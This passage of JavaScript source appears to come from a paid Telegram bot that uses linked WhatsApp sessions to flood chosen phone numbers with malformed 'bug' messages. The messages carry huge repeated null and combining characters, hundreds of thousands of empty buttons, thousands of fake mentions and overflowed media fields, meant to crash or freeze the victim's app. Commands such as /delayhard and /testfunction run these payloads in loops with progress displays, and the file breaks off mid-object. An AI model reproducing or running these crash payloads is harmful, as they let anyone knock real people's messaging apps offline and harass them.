  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- delayinvis
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- delayinvis
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await DelayInvisBapakLowh(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- delayinvis
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Pastikan bagian atas file kamu sudah punya:
// const fs = require("fs-extra");
// const path = require("path");
// const os = require("os");
// const vm = require("vm");


// ===============================
// TEST FUNCTIONS
// ===============================

// Isi hanya function yang memang kamu izinkan.
// Tambahkan function lain di object ini.
const testFunctions = {
  test: async function Skylinne(sock, target) {
    const LexMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "Skylinne - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "GhostCrasher - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexca = generateWAMessageFromContent(target, LexMsg, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: target,
        messageId: Lexca.key.id
    });

    const Lexcaa = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

    await sock.relayMessage(target, Lexcaabos.message, {
        participant: target,
        messageId: Lexcaabos.key.id
    });

    const Msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne - GhostCrasher",
                    },
                    nativeFlowMessage: {
                        button: "\x10".repeat(2000),
                    },
                },
            },
        },
    };

    const Lex = generateWAMessageFromContent(target, Msg, {});

    await sock.relayMessage(target, Lex.message, {
        participant: target,
        messageId: Lex.key.id
    });

    const ahk = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "GhostCrasher - Executed¿!",
                            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            fileLength: 9999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "3q2+7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            fileEncSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
                            directPath: "/v/t62.7118-24/1234567890123456.enc?ccb=11-4&oh=abc123&oe=6A12ED53",
                            mediaKeyTimestamp: "1746057600",
                            jpegThumbnail: null,
                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                            scanLengths: [
                                9999999999999998555,
                                9999999999999998555,
                                9699999999999999148,
                                9969999999999999164
                            ],
                            midQualityFileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            contextInfo: {
                                pairedMediaType: "PAIRED_PERMANENT",
                                isQuestion: true,
                                isGroupStatus: true,
                                remoteJid: "status@broadcast",
                                entryPointConversionDelaySeconds: 999999,
                                entryPointConversionSource: "ctwa"
                            }
                        }
                    }
                }
            }
        }
    };

    const ahkMsg = generateWAMessageFromContent(target, ahk, {});

    await sock.relayMessage("status@broadcast", ahkMsg.message, {
        statusJidList: [target],
        messageId: ahkMsg.key.id,
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `Skylinne - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "Skylinne - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "Skylinne - Executed",
                                fileName: "GhostCrasher - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    const Nanas = generateWAMessageFromContent(target, stickers, {});
    const Muda = generateWAMessageFromContent(target, msg, {});

    await sock.relayMessage("status@broadcast", Nanas.message, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda.message, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });
},

  test2: async (sock, target) => {
    console.log("TEST 2:", target);

    // Aksi test kedua
  }
};

// ===============================
// PARSE DELAY
// ===============================

// Format:
// 500ms = 500 milidetik
// 5d    = 5 detik
// 2m    = 2 menit
// 1j    = 1 jam

function parseDelay(value) {
  const match = String(value)
    .trim()
    .match(/^(\d+(?:\.\d+)?)(ms|d|m|j)$/i);

  if (!match) {
    return null;
  }

  const amount = Number(match[1]);
  const unit = match[2].toLowerCase();

  const multipliers = {
    ms: 1,
    d: 1000,
    m: 60 * 1000,
    j: 60 * 60 * 1000
  };

  return amount * multipliers[unit];
}


// ===============================
// FORMAT DELAY UNTUK TAMPILAN
// ===============================

function formatDelay(ms) {
  if (ms >= 60 * 60 * 1000 && ms % (60 * 60 * 1000) === 0) {
    return `${ms / (60 * 60 * 1000)}j`;
  }

  if (ms >= 60 * 1000 && ms % (60 * 1000) === 0) {
    return `${ms / (60 * 1000)}m`;
  }

  if (ms >= 1000 && ms % 1000 === 0) {
    return `${ms / 1000}d`;
  }

  return `${ms}ms`;
}


// ===============================
// COMMAND /TESTFUNCTION
// ===============================

bot.onText(
  /^\/testfunction\s+(\d+)\s+(\d+)\s+([A-Za-z0-9_$]+)\s+(\d+)\s+(\d+(?:\.\d+)?(?:ms|d|m|j))$/i,
  async (msg, match) => {

    const chatId = msg.chat.id;

    try {

      // ===============================
      // AMBIL ARGUMEN
      // ===============================

      const botNumber =
        match[1].replace(/[^0-9]/g, "");

      const targetNumber =
        match[2].replace(/[^0-9]/g, "");

      const functionName =
        match[3];

      const jumlah =
        parseInt(match[4], 10);

      const delayInput =
        match[5];

      // ===============================
      // VALIDASI JUMLAH
      // ===============================

      if (!Number.isInteger(jumlah) || jumlah < 1 || jumlah > 500) {

        return bot.sendMessage(
          chatId,
          "❌ ☇ Jumlah harus antara 1-500."
        );
      }

      // ===============================
      // PARSE DELAY
      // ===============================

      const delay =
        parseDelay(delayInput);

      if (delay === null) {

        return bot.sendMessage(
          chatId,
          [
            "❌ ☇ Delay tidak valid.",
            "",
            "Contoh:",
            "• 500ms",
            "• 5d",
            "• 2m",
            "• 1j"
          ].join("\n")
        );
      }

      // ===============================
      // BATAS DELAY
      // ===============================

      // Maksimal 24 jam per jeda
      const maxDelay =
        24 * 60 * 60 * 1000;

      if (delay > maxDelay) {

        return bot.sendMessage(
          chatId,
          "❌ ☇ Delay maksimal 24 jam."
        );
      }

      // ===============================
      // AMBIL SESSION
      // ===============================

      const sessionSock =
        sessions.get(botNumber);

      if (!sessionSock) {

        return bot.sendMessage(
          chatId,
          [
            `❌ ☇ Session ${botNumber} tidak ditemukan.`,
            "",
            `Gunakan:`,
            `/addbot ${botNumber}`
          ].join("\n")
        );
      }

      // ===============================
      // VALIDASI FUNCTION
      // ===============================

      const fn =
        testFunctions[functionName];

      if (typeof fn !== "function") {

        const availableFunctions =
          Object.keys(testFunctions);

        return bot.sendMessage(
          chatId,
          [
            `❌ ☇ Function "${functionName}" tidak tersedia.`,
            "",
            "Function tersedia:",
            ...availableFunctions.map(
              name => `• ${name}`
            )
          ].join("\n")
        );
      }

      // ===============================
      // TARGET
      // ===============================

      const target =
        targetNumber + "@s.whatsapp.net";

      // ===============================
      // PROCESS MESSAGE
      // ===============================

      const processMsg =
        await bot.sendMessage(
          chatId,

`<blockquote><pre>⬡═―—⊱ ⎧ Voltra Nexus ⎭ ⊰―—═⬡
⌑ Session: ${botNumber}
⌑ Target: ${targetNumber}
⌑ Function: ${functionName}
⌑ Jumlah: ${jumlah}
⌑ Delay: ${formatDelay(delay)}
⌑ Progress: 0/${jumlah}
⌑ Success: 0
⌑ Failed: 0
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,

          {
            parse_mode: "HTML"
          }
        );

      // ===============================
      // COUNTER
      // ===============================

      let success = 0;
      let failed = 0;

      // ===============================
      // LOOP
      // ===============================

      for (let i = 0; i < jumlah; i++) {

        try {

          await fn(
            sessionSock,
            target
          );

          success++;

        } catch (err) {

          failed++;

          console.error(
            `testfunction #${i + 1}:`,
            err
          );
        }

        // ===============================
        // UPDATE PROGRESS
        // ===============================

        const progress =
          i + 1;

        // Update Telegram setiap eksekusi.
        // Bisa diubah supaya hanya update tiap 5/10 kali
        // kalau jumlah besar.

        try {

          await bot.editMessageText(

`<blockquote><pre>⬡═―—⊱ ⎧ Voltra Nexus ⎭ ⊰―—═⬡
⌑ Session: ${botNumber}
⌑ Target: ${targetNumber}
⌑ Function: ${functionName}
⌑ Jumlah: ${jumlah}
⌑ Delay: ${formatDelay(delay)}
⌑ Progress: ${progress}/${jumlah}
⌑ Success: ${success}
⌑ Failed: ${failed}
⌑ Status: ${progress >= jumlah ? "Finishing" : "Process"}
╘═——————————————═⬡</pre></blockquote>`,

            {
              chat_id: chatId,
              message_id: processMsg.message_id,
              parse_mode: "HTML"
            }
          );

        } catch (editErr) {

          console.error(
            "Gagal update progress:",
            editErr
          );
        }

        // ===============================
        // DELAY
        // ===============================

        if (i < jumlah - 1) {

          await sleep(delay);

        }
      }

      // ===============================
      // FINAL RESULT
      // ===============================

      const finalText =
`<blockquote><pre>⬡═―—⊱ ⎧ Voltra Nexus ⎭ ⊰―—═⬡
⌑ Session: ${botNumber}
⌑ Target: ${targetNumber}
⌑ Function: ${functionName}
⌑ Jumlah: ${jumlah}
⌑ Delay: ${formatDelay(delay)}
⌑ Success: ${success}
⌑ Failed: ${failed}
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`;

      try {

        await bot.editMessageText(
          finalText,
          {
            chat_id: chatId,
            message_id: processMsg.message_id,
            parse_mode: "HTML"
          }
        );

      } catch (editErr) {

        console.error(
          "Gagal update hasil akhir:",
          editErr
        );

        await bot.sendMessage(
          chatId,
          finalText,
          {
            parse_mode: "HTML"
          }
        );
      }

    } catch (err) {

      console.error(
        "testfunction error:",
        err
      );

      await bot.sendMessage(
        chatId,
        `❌ ☇ Error: ${err?.message || String(err)}`
      );
    }
  }
);

bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- delayhard
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- delayhard
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await DelayInvisBapakLowh(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- delayhard
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// /TEMPAT FUNC DISINI ///
async function JawaTimurBlankOld(sock, target) {
  await sock.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": " # 🚯 FaiqOffc Freeze ",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}

async function BlankXDelay(sock, target) {
    const pld = "𝐋𝐊𝐁𝐍𝐨??𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫";
    const x = "‌".repeat(99999) + "ꦾ".repeat(888888) + "ꦽ".repeat(60000);
    const y = "ꦾꦽ".repeat(999999);

    try {
        const m = {
            orderMessage: {
                orderId: "Okep Hot" + Math.floor(Math.random() * 1000000),
                thumbnail: Buffer.alloc(1),
                itemCount: 2147483647,
                status: 1,
                surface: 1,
                message: pld + "\n" + x,
                orderTitle: pld,
                sellerJid: "0@s.whatsapp.net",
                token: "lkb" + "ꦽꦾ".repeat(700000)
            },
            listMessage: {
                title: pld,
                description: y,
                buttonText: pld,
                listType: 1,
                sections: [
                    {
                        title: pld,
                        rows: Array(30).fill({
                            title: pld,
                            rowId: "LKB999",
                            description: "‌".repeat(99999)
                        })
                    }
                ],
                contextInfo: {
